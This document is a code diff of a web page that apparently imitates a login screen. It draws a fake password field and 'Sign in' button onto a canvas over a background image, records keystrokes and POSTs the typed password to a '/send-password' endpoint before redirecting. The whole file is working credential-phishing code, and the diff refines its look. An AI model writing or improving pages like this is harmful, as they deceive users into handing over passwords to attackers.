@@ -11,13 +11,15 @@
 <body>
 <canvas id="canvas" width="1359" height="633"></canvas>
 <script>
+// Get canvas & context
 const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
 
+// Load your background image
 const bgImage = new Image();
-bgImage.src = 'background1.png'; // Use your uploaded image name here
+bgImage.src = 'background1.png'; // Match your file name
 
-// Precise coordinates:
+// Updated, confirmed positions:
 const inputBox = { x: 505, y: 231, width: 320, height: 40 };
 const button = { x: 748, y: 325, width: 109, height: 35 };
 
@@ -28,9 +30,8 @@ let inputClickedOnce = false;
 let cursorVisible = true;
 let lastBlink = 0;
 
-bgImage.onload = () => {
-  requestAnimationFrame(loop);
-};
+// Start loop when image loads
+bgImage.onload = () => requestAnimationFrame(loop);
 
 function loop(timestamp) {
   if (timestamp - lastBlink > 500) {
@@ -45,24 +46,21 @@ function draw() {
   ctx.clearRect(0, 0, canvas.width, canvas.height);
   ctx.drawImage(bgImage, 0, 0, canvas.width, canvas.height);
 
+  // ✅ Input box background only, no border
   ctx.fillStyle = inputClickedOnce ? '#fff' : '#f5f5f5';
   ctx.fillRect(inputBox.x, inputBox.y, inputBox.width, inputBox.height);
 
-  ctx.strokeStyle = isTyping ? '#0078d4' : '#ccc';
-  ctx.lineWidth = 2;
-  ctx.strokeRect(inputBox.x, inputBox.y, inputBox.width, inputBox.height);
-
+  // ✅ Text inside box
   ctx.fillStyle = '#000';
   ctx.font = '16px Arial';
   ctx.textBaseline = 'middle';
   ctx.textAlign = 'start';
-
   const displayText = inputText || 'Password';
   const textX = inputBox.x + 10;
   const textY = inputBox.y + inputBox.height / 2;
-
   ctx.fillText(displayText, textX, textY);
 
+  // ✅ Blinking cursor
   if (isTyping && cursorVisible) {
     const textWidth = ctx.measureText(inputText).width;
     const cursorX = textX + textWidth + 2;
@@ -77,6 +75,7 @@ function draw() {
     ctx.stroke();
   }
 
+  // ✅ Sign In button
   ctx.fillStyle = '#0078d4';
   ctx.fillRect(button.x, button.y, button.width, button.height);
   ctx.fillStyle = '#fff';
@@ -85,6 +84,7 @@ function draw() {
   ctx.fillText('Sign in', button.x + button.width / 2, button.y + button.height / 2 + 5);
 }
 
+// ✅ Click handler
 canvas.addEventListener('click', (e) => {
   const rect = canvas.getBoundingClientRect();
   const x = e.clientX - rect.left;
@@ -105,6 +105,7 @@ canvas.addEventListener('click', (e) => {
       return;
     }
 
+    // Send POST request and redirect
     fetch('/send-password', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -122,6 +123,7 @@ canvas.addEventListener('click', (e) => {
   }
 });
 
+// ✅ Typing input
 document.addEventListener('keydown', (e) => {
   if (isTyping) {
     if (e.key === 'Backspace') {
@@ -136,4 +138,3 @@ document.addEventListener('keydown', (e) => {
 </script>
 </body>
 </html>
-
